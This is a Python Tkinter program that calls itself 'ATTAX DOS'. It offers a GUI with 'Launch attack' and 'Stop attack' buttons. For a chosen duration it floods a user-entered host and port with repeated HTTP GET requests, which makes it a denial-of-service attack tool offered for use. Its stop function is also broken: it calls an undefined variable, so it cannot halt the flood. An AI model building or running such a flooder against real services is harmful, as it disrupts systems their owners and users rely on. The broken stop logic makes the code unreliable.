from tkinter import *
import tkinter as tk
import requests
import time
import os
import platform
from threading import Thread, Event

stop_event = Event()
theme = "lightblue"
clr = theme

if platform.system() == 'Linux':
    os.system("clear")
else:
    os.system("cls")

def send_http_requests(protocol, host, port, duration):
    timeout = time.time() + duration
    url = f"{protocol}://{host}:{port}"

    print(f"Sending HTTP requests to {url} for {duration} seconds")
    status_var.set(f"Sending requests to {url}...")

    while time.time() < timeout and not stop_event.is_set():
        try:
            response = requests.get(url)
            status = f"Response status code: {response.status_code}"
            print(status)
            status_var.set(status)
        except requests.exceptions.RequestException as e:
            error_msg = f"Error sending request: {e}"
            print(error_msg)
            status_var.set(error_msg)
            
def save_input():
    protocol = protocol_var.get()
    host = host_entry.get().strip() 
    port_str = port_entry.get().strip()
    try:
        port = int(port_str)
    except ValueError:
        status_var.set("Invalid port number.")
        return

    duration = int(duration_scale.get())

    print(f"Protocol: {protocol}")
    print(f"Host: {host}")
    print(f"Port: {port}")
    print(f"Duration: {duration} seconds")

    if not host:
        status_var.set("Host cannot be empty.")
        return
    stop_event.clear()
    thread = Thread(target=send_http_requests, args=(protocol, host, port, duration))
    thread.start()

    if platform.system() == 'Linux':
        os.system("clear")
    else:
        os.system("cls")

def stop_requests():
    theme_var.set()
    status_var.set("Requests stopped.")

def change_theme():
    global theme
    font_settings = ("Arial")
    text_color = "black"
    if theme == 'lightblue':
        theme = "#00ff07"
    elif theme == "#00ff07":
        theme = "lightyellow"
    elif theme == "lightyellow":
        theme = "pink"
    elif theme == "pink":
        theme = "#00a5ff"
    elif theme == "#00a5ff":
        theme = "white"
    elif theme == "white":
        theme = "grey"
    elif theme == "grey":
        theme = "#6814eb"
    elif theme == "#6814eb":
        theme = "black"
        text_color = "lime"
    elif theme == "black":
        theme = "lightblue"
        
    root.config(bg=theme)
    w.config(bg=theme , fg=text_color )
    status_label.config(bg=theme, font=font_settings, fg=text_color)
    protocol_label.config(bg=theme, font=font_settings, fg=text_color)
    http_radio.config(bg=theme, font=font_settings, fg=text_color)
    https_radio.config(bg=theme, font=font_settings, fg=text_color)
    host_label.config(bg=theme, font=font_settings, fg=text_color)
    port_label.config(bg=theme, font=font_settings, fg=text_color)
    duration_label.config(bg=theme, font=font_settings, fg=text_color)



root = tk.Tk()
root.geometry("500x500")
root.configure(bg=clr)
root.title("Attax")

w = Label(root, text='A T T A X _  D O S', font=("Arial", 20))
w.configure(bg=clr)
w.place(x=150, y=75)

status_label = Label(root, text="Status:", bg=theme)
status_label.place(x=50, y=160)
status_var = tk.StringVar(value="waiting for input...")
status_entry = tk.Entry(root, textvariable=status_var, state='readonly', width=30, bg=theme)
status_entry.place(x=150, y=160)

protocol_var = StringVar(value='http')
protocol_label = Label(root, text="Protocol:", bg=clr)
protocol_label.place(x=50, y=200)
http_radio = Radiobutton(root, text="HTTP", variable=protocol_var, value='http', bg=clr)
http_radio.place(x=150, y=200)
https_radio = Radiobutton(root, text="HTTPS", variable=protocol_var, value='https', bg=clr)
https_radio.place(x=300, y=200)

host_label = Label(root, text="Host:", bg=clr)
host_label.place(x=50, y=240)
host_entry = tk.Entry(root, width=30)
host_entry.place(x=150, y=240)

port_label = Label(root, text="Port:", bg=clr)
port_label.place(x=50, y=280)
port_entry = tk.Entry(root, width=30)
port_entry.place(x=150, y=280)

duration_label = Label(root, text="Duration:", bg=clr)
duration_label.place(x=50, y=320)
duration_scale = tk.Scale(root, from_=1, to=120, orient=HORIZONTAL, length=250)
duration_scale.set(1)
duration_scale.place(x=150, y=320)

save_button = tk.Button(root, text="Launch attack", command=save_input)
save_button.place(x=100, y=420)

stop_button = tk.Button(root, text="Change theme", command=change_theme)
stop_button.place(x=220, y=420)

stop_button = tk.Button(root, text="Stop attack", command=stop_requests)
stop_button.place(x=350, y=420)


root.mainloop()
